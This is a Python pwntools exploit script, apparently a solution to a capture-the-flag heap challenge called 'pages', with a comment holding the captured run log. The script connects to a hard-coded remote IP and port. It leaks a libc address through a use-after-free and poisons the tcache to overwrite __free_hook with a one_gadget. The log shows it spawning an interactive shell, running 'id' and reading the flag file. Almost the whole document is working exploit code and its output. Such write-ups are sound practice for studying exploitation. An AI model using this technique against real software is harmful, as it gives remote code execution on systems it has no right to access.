from pwn import *
import random

#context.log_level = 'debug'
#context.terminal = ["tmux", "sp", "-h"]

REMOTE = 1

HOST = '167.99.129.209'
PORT = 10005

# array containing virtual addresses
addrs = []

# initial address for chunk identification purposes
curr = 0xdeadbe00

# chunk count
n_chunks = 0
page = 0

if(REMOTE):
	r = remote(HOST, PORT)
else:
	r = process('./pages_debug', env={'LD_PRELOAD':'./libc-2.27.so'})
	
# this function writes a vaddr
def write(addr, data):
	r.recvuntil(b'ce >')
	r.sendline(b'1')
	r.recvuntil(b'ss >')
	r.sendline(hex(addr))
	r.recvuntil(b'a >')
	r.sendline(data)
	return

# this function reads a vaddr
def read(addr, length):
	r.recvuntil(b'ce >')
	r.sendline(b'2')
	r.recvuntil(b'ss >')
	r.sendline(hex(addr))
	r.recvuntil(b'th >')
	r.sendline(str(length))
	r.recvuntil(b'==> ')
	data = r.recvuntil(b'\n1.')
	data = data.replace(b'\n1.', b'')
	return data

# increment vaddr's l0
def inc_l0(addr):
	return addr+0x00055000

# increment vaddr's l1
def inc_l1(addr):
	return addr+0x00000000

# with this function we get a new address incrementing id and
# assigning it
def new_id():
	global addrs
	global n_chunks
	global curr
	addr = inc_l1(inc_l0(curr))
	curr = addr
	addrs.append(addr)
	n_chunks += 1
	return addr

# with this function we get virtual address given chunk id
def get_id(idx):
	global addrs
	return addrs[idx]

def pad(addr):
	addr = addr + '\x00'*(8- len(addr))
	return addr
	
# I guess one_gadgets[2] is the best (no restrictive constraints)
one_gadgets = [0x4f3d5, 0x4f432, 0x10a41c]

# libc offsets
free_hook_off = 0x3ed8e8
malloc_hook_off = 0x3ebc30
main_arena = 0x3ebca0
system_off = 0x4f550
binsh_off = 0x1b3e1a

# debug if we are locally
if(not REMOTE):
	gdb.attach(r)
	pause()

log.info('Filling tcache...')

for _ in range(8+3+3+3):
	read(new_id(), 0) # indexes [0, 7]

time.sleep(5)

read(new_id(), 0) # idx = 8


time.sleep(10)

read(get_id(0), 8)

log.info('Triggering UAF to leak main_arena')

main_arena_leak = u64(pad(read(get_id(10), 8)))

pause()

log.info(f'Leaked: main_arena @ {hex(main_arena_leak)}')

libc_base = main_arena_leak - main_arena

log.info(f'Leaked: libc base @ {hex(libc_base)}')

free_hook = libc_base + free_hook_off

log.info(f'Leaked: __free_hook @ {hex(free_hook)}')

malloc_hook = libc_base + malloc_hook_off

log.info(f'Leaked: __malloc_hook @ {hex(malloc_hook)}')

system = libc_base + system_off

log.info(f'Leaked: system @ {hex(system)}')

binsh = libc_base + binsh_off

log.info(f'Leaked: /bin/sh @ {hex(binsh)}')

gadget_1 = libc_base + one_gadgets[0]

log.info(f'Leaked: one gadget #1 @ {hex(gadget_1)}')

gadget_2 = libc_base + one_gadgets[1]

log.info(f'Leaked: one gadget #2 @ {hex(gadget_2)}')

gadget_3 = libc_base + one_gadgets[2]

log.info(f'Leaked: one gadget #3 @ {hex(gadget_3)}')

log.info('Poisoning tcache bin...')

write(get_id(0), p64(free_hook))

for _ in range(8):
	read(new_id(), 0) # random chunk will be returned

log.info('__free_hook returned!')

write(new_id(), p64(gadget_3))

time.sleep(11)

r.recv()
r.recvuntil('>')
r.sendline('x')
r.recvuntil('>')
log.success('Shell popped!')
r.interactive()
r.close()

'''
lockedbyte@pwn:~/Desktop/NETONCTF/pages$ python exploit.py 
[+] Opening connection to 167.99.129.209 on port 10005: Done
[*] Filling tcache...
[*] Triggering UAF to leak main_arena
[*] Paused (press any to continue)
[*] Leaked: main_arena @ 0x7ffb5c667ca0
[*] Leaked: libc base @ 0x7ffb5c27c000
[*] Leaked: __free_hook @ 0x7ffb5c6698e8
[*] Leaked: __malloc_hook @ 0x7ffb5c667c30
[*] Leaked: system @ 0x7ffb5c2cb550
[*] Leaked: /bin/sh @ 0x7ffb5c42fe1a
[*] Leaked: one gadget #1 @ 0x7ffb5c2cb3d5
[*] Leaked: one gadget #2 @ 0x7ffb5c2cb432
[*] Leaked: one gadget #3 @ 0x7ffb5c38641c
[*] Poisoning tcache bin...
[*] __free_hook returned!
[+] Shell popped!
[*] Switching to interactive mode
 $ id
uid=1000(ctf) gid=1000(ctf) groups=1000(ctf)
$ cat flag.txt
NETON{y0_bu7_p4g1ng_w45_s0m3_0b5cur3_k3rn3l_sh17_r1gh7?}
$  
'''






